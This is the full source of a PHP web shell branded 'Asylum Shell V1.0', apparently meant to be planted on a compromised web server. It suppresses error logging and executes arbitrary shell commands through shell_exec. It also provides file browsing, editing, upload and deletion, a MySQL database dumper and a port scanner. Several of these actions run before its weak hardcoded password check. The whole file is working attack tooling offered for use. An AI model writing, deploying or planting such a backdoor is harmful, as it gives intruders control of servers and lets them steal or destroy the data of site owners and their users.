<?php
session_start();
error_reporting(0);
set_time_limit(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "admin"; // Password

// Functions
function get_system_info() {
    return array(
        'current_path' => getcwd(),
        'os' => php_uname(),
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'],
        'server_ip' => $_SERVER['SERVER_ADDR'],
        'your_ip' => $_SERVER['REMOTE_ADDR']
    );
}

function format_size($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function delete_directory($dirPath) {
    if (!is_dir($dirPath)) return false;
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            delete_directory($file);
        } else {
            unlink($file);
        }
    }
    return rmdir($dirPath);
}

function dump_database($type, $host, $user, $pass, $db) {
    switch($type) {
        case 'mysql':
            $conn = mysqli_connect($host, $user, $pass, $db);
            if(!$conn) return false;
            
            $tables = array();
            $result = mysqli_query($conn, "SHOW TABLES");
            while($row = mysqli_fetch_row($result)) {
                $tables[] = $row[0];
            }
            
            $dump = "";
            foreach($tables as $table) {
                $result = mysqli_query($conn, "SELECT * FROM $table");
                $dump .= "DROP TABLE IF EXISTS $table;\n";
                
                $row2 = mysqli_fetch_row(mysqli_query($conn, "SHOW CREATE TABLE $table"));
                $dump .= "\n\n" . $row2[1] . ";\n\n";
                
                while($row = mysqli_fetch_assoc($result)) {
                    $dump .= "INSERT INTO $table VALUES(";
                    foreach($row as $data) {
                        $dump .= "'" . mysqli_real_escape_string($conn, $data) . "',";
                    }
                    $dump = rtrim($dump, ',');
                    $dump .= ");\n";
                }
                $dump .= "\n\n";
            }
            mysqli_close($conn);
            return $dump;
    }
    return false;
}

function scan_ports($host, $ports) {
    $results = array();
    $ports = explode(',', $ports);
    foreach($ports as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, 2);
        if(is_resource($connection)) {
            $results[] = "Port $port is open";
            fclose($connection);
        } else {
            $results[] = "Port $port is closed";
        }
    }
    return implode("\n", $results);
}

function whois_lookup($domain) {
    $whoisservers = array(
        "com" => "whois.verisign-grs.com",
        "net" => "whois.verisign-grs.com",
        "org" => "whois.pir.org",
        "info" => "whois.afilias.net",
        "biz" => "whois.biz",
        "io" => "whois.nic.io"
    );
    
    $domain = strtolower(trim($domain));
    $arr = explode(".", $domain);
    $tld = array_pop($arr);
    
    if(!isset($whoisservers[$tld])) return "No whois server for $tld found!";
    
    $result = "";
    $sock = fsockopen($whoisservers[$tld], 43, $errno, $errstr, 10);
    if($sock) {
        fwrite($sock, $domain . "\r\n");
        while(!feof($sock)) {
            $result .= fgets($sock, 128);
        }
        fclose($sock);
    }
    return $result;
}

function generate_hash($text, $algorithm) {
    switch($algorithm) {
        case 'md5': return md5($text);
        case 'sha1': return sha1($text);
        case 'sha256': return hash('sha256', $text);
        case 'sha512': return hash('sha512', $text);
        default: return "Invalid algorithm";
    }
}

// Process Actions
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'dump_db':
            $dump = dump_database(
                $_POST['db_type'],
                $_POST['host'],
                $_POST['user'],
                $_POST['pass'],
                $_POST['db']
            );
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="db_dump.sql"');
            echo $dump;
            exit;
            
        case 'scan_ports':
            echo scan_ports($_POST['host'], $_POST['ports']);
            exit;
            
        case 'whois':
            echo whois_lookup($_POST['domain']);
            exit;
            
        case 'generate_hash':
            echo generate_hash($_POST['text'], $_POST['algorithm']);
            exit;
            
        case 'change_dir':
            if(chdir($_POST['newdir'])) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false]);
            }
            exit;
            
        case 'edit_file':
            $path = $_POST['path'];
            if(file_exists($path)) {
                if(isset($_POST['content'])) {
                    if(file_put_contents($path, $_POST['content'])) {
                        echo json_encode(['success' => true]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Could not write to file']);
                    }
                } else {
                    echo json_encode(['success' => true, 'content' => file_get_contents($path)]);
                }
            } else {
                echo json_encode(['success' => false, 'error' => 'File not found']);
            }
            exit;
            
        case 'delete_file':
            $path = $_POST['path'];
            if(is_dir($path)) {
                $success = delete_directory($path);
            } else {
                $success = unlink($path);
            }
            echo json_encode(['success' => $success]);
            exit;
    }
}

// File Upload Handler
if(isset($_FILES['uploadfile'])) {
    $uploadfile = $_FILES['uploadfile'];
    if(move_uploaded_file($uploadfile['tmp_name'], $current_dir . '/' . $uploadfile['name'])) {
        $upload_message = "File uploaded successfully!";
    } else {
        $upload_message = "Upload failed!";
    }
}

// Authentication
if(!isset($_SESSION['wso_auth'])) {
    if(isset($_POST['pwd']) && $_POST['pwd'] == $auth_pass) {
        $_SESSION['wso_auth'] = true;
    } else {
        include('login.php');
        exit;
    }
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
chdir($current_dir);

// Command Execution
if(isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Asylum Shell</title>
    <style>
        body {
            background: #000000;
            color: #00FF00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .header {
            background: #0D0D0D;
            padding: 15px;
            border: 1px solid #00FF00;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .section {
            background: #0D0D0D;
            padding: 15px;
            border: 1px solid #00FF00;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .tool-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 15px 0;
        }
        .tool-btn {
            background: #000000;
            border: 1px solid #00FF00;
            color: #00FF00;
            padding: 8px 15px;
            border-radius: 3px;
            cursor: pointer;
        }
        .tool-btn:hover {
            background: #0D0D0D;
        }
        input, select, textarea {
            background: #000000;
            border: 1px solid #00FF00;
            color: #00FF00;
            padding: 8px;
            margin: 5px;
            border-radius: 3px;
            width: calc(100% - 20px);
        }
        button, .btn {
            background: #000000;
            border: 1px solid #00FF00;
            color: #00FF00;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 3px;
        }
        .btn-danger {
            border-color: #FF0000;
            color: #FF0000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }
        th, td {
            border: 1px solid #00FF00;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #0D0D0D;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
        }
        .modal-content {
            background: #000000;
            border: 1px solid #00FF00;
            width: 80%;
            margin: 10% auto;
            padding: 20px;
            border-radius: 4px;
        }
        pre {
            background: #0D0D0D;
            padding: 10px;
            border: 1px solid #00FF00;
            border-radius: 4px;
            overflow-x: auto;
        }
        #editor {
            width: 100%;
            height: 400px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Asylum_Shell V1.0</h1>
    </div>

    <div class="section">
        <h2>System Information</h2>
        <?php $sysinfo = get_system_info(); ?>
        <table>
            <?php foreach($sysinfo as $key => $value): ?>
            <tr>
                <td><strong><?php echo ucwords(str_replace('_', ' ', $key)); ?></strong></td>
                <td><?php echo $value; ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <div class="section">
        <div class="tool-buttons">
            <button onclick="showDBDumper()" class="tool-btn">Database Dumper</button>
            <button onclick="showPortScanner()" class="tool-btn">Port Scanner</button>
            <button onclick="showWhois()" class="tool-btn">WHOIS Lookup</button>
            <button onclick="showHashGen()" class="tool-btn">Hash Generator</button>
        </div>
    </div>

    <div class="section">
        <h2>Command Execution</h2>
        <form method="post">
            <input type="text" name="cmd" style="width: 80%;" placeholder="Command...">
            <input type="submit" value="Execute">
        </form>
        <?php if(isset($output)): ?>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

    <div class="section">
        <h2>File Manager</h2>
        <div class="section">
            <h3>Change Directory</h3>
            <form onsubmit="return changeDirectory(this)">
                <input type="text" name="newdir" placeholder="Directory path..." value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 80%;">
                <input type="submit" value="Change Dir">
            </form>
        </div>
        
        <div class="section">
            <h3>File Upload</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="uploadfile">
                <input type="submit" value="Upload">
            </form>
            <?php if(isset($upload_message)): ?>
                <div class="alert"><?php echo $upload_message; ?></div>
            <?php endif; ?>
        </div>

        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php
            $files = scandir($current_dir);
            foreach($files as $file):
                $fullpath = $current_dir . '/' . $file;
            ?>
            <tr>
                <td><?php echo $file; ?></td>
                <td><?php echo is_dir($fullpath) ? 'DIR' : format_size(filesize($fullpath)); ?></td>
                <td><?php echo substr(sprintf('%o', fileperms($fullpath)), -4); ?></td>
                <td>
                                        <?php if(is_dir($fullpath)): ?>
                        <button onclick="changeDirectory('<?php echo addslashes($fullpath); ?>')" class="btn">Open</button>
                    <?php else: ?>
                        <button onclick="downloadFile('<?php echo addslashes($fullpath); ?>')" class="btn">Download</button>
                        <button onclick="editFile('<?php echo addslashes($fullpath); ?>')" class="btn">Edit</button>
                    <?php endif; ?>
                    <button onclick="deleteFile('<?php echo addslashes($fullpath); ?>')" class="btn btn-danger">Delete</button>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <!-- Modals -->
    <div id="dbDumper" class="modal">
        <div class="modal-content">
            <h3>Database Dumper</h3>
            <form onsubmit="return dumpDatabase(this)">
                <select name="db_type">
                    <option value="mysql">MySQL</option>
                    <option value="pgsql">PostgreSQL</option>
                    <option value="mongodb">MongoDB</option>
                    <option value="sqlite">SQLite</option>
                </select>
                <input type="text" name="host" placeholder="Host">
                <input type="text" name="user" placeholder="Username">
                <input type="password" name="pass" placeholder="Password">
                <input type="text" name="db" placeholder="Database Name">
                <input type="submit" value="Dump Database">
            </form>
        </div>
    </div>

    <div id="portScanner" class="modal">
        <div class="modal-content">
            <h3>Port Scanner</h3>
            <form onsubmit="return scanPorts(this)">
                <input type="text" name="host" placeholder="Host/IP">
                <input type="text" name="ports" placeholder="Ports (e.g., 80,443,3306)">
                <input type="submit" value="Scan">
            </form>
            <div id="scanResults"></div>
        </div>
    </div>

    <div id="whois" class="modal">
        <div class="modal-content">
            <h3>WHOIS Lookup</h3>
            <form onsubmit="return lookupWhois(this)">
                <input type="text" name="domain" placeholder="Domain/IP">
                <input type="submit" value="Lookup">
            </form>
            <pre id="whoisResults"></pre>
        </div>
    </div>

    <div id="hashGen" class="modal">
        <div class="modal-content">
            <h3>Hash Generator</h3>
            <form onsubmit="return generateHash(this)">
                <input type="text" name="text" placeholder="Text to hash">
                <select name="algorithm">
                    <option value="md5">MD5</option>
                    <option value="sha1">SHA1</option>
                    <option value="sha256">SHA256</option>
                    <option value="sha512">SHA512</option>
                </select>
                <input type="submit" value="Generate">
            </form>
            <div id="hashResult"></div>
        </div>
    </div>

    <div id="fileEditor" class="modal">
        <div class="modal-content">
            <h3>File Editor</h3>
            <textarea id="editor"></textarea>
            <button onclick="saveFile()" class="btn">Save</button>
        </div>
    </div>

    <script>
        let currentEditingFile = '';

        // Database Functions
        function showDBDumper() {
            document.getElementById('dbDumper').style.display = 'block';
        }

        function dumpDatabase(form) {
            let formData = new FormData(form);
            formData.append('action', 'dump_db');
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.blob())
            .then(blob => {
                let url = window.URL.createObjectURL(blob);
                let a = document.createElement('a');
                a.href = url;
                a.download = 'database_dump.sql';
                a.click();
            });
            return false;
        }

        // Port Scanner Functions
        function showPortScanner() {
            document.getElementById('portScanner').style.display = 'block';
        }

        function scanPorts(form) {
            let formData = new FormData(form);
            formData.append('action', 'scan_ports');
            document.getElementById('scanResults').innerHTML = 'Scanning...';
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('scanResults').innerHTML = data;
            });
            return false;
        }

        // WHOIS Functions
        function showWhois() {
            document.getElementById('whois').style.display = 'block';
        }

        function lookupWhois(form) {
            let formData = new FormData(form);
            formData.append('action', 'whois');
            document.getElementById('whoisResults').innerHTML = 'Looking up...';
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('whoisResults').innerHTML = data;
            });
            return false;
        }

        // Hash Generator Functions
        function showHashGen() {
            document.getElementById('hashGen').style.display = 'block';
        }

        function generateHash(form) {
            let formData = new FormData(form);
            formData.append('action', 'generate_hash');
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('hashResult').innerHTML = data;
            });
            return false;
        }

        // File Management Functions
        function changeDirectory(path) {
            let formData = new FormData();
            formData.append('action', 'change_dir');
            formData.append('newdir', path);
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    window.location.reload();
                } else {
                    alert('Failed to change directory');
                }
            });
            return false;
        }

        function editFile(path) {
            currentEditingFile = path;
            let formData = new FormData();
            formData.append('action', 'edit_file');
            formData.append('path', path);
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    document.getElementById('editor').value = data.content;
                    document.getElementById('fileEditor').style.display = 'block';
                } else {
                    alert(data.error || 'Failed to open file');
                }
            });
        }

        function saveFile() {
            let content = document.getElementById('editor').value;
            let formData = new FormData();
            formData.append('action', 'edit_file');
            formData.append('path', currentEditingFile);
            formData.append('content', content);
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    alert('File saved successfully');
                    document.getElementById('fileEditor').style.display = 'none';
                } else {
                    alert(data.error || 'Failed to save file');
                }
            });
        }

        function deleteFile(path) {
            if(confirm('Are you sure you want to delete: ' + path + '?')) {
                let formData = new FormData();
                formData.append('action', 'delete_file');
                formData.append('path', path);
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if(data.success) {
                        window.location.reload();
                    } else {
                        alert('Failed to delete file/directory');
                    }
                });
            }
        }

        // Modal Management
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }

        // Close button for modals
        document.querySelectorAll('.modal').forEach(modal => {
            let closeBtn = document.createElement('span');
            closeBtn.innerHTML = '×';
            closeBtn.style.cssText = 'position:absolute;right:15px;top:10px;cursor:pointer;font-size:20px;';
            closeBtn.onclick = function() {
                modal.style.display = 'none';
            };
            modal.querySelector('.modal-content').appendChild(closeBtn);
        });
    </script>
</body>
</html>

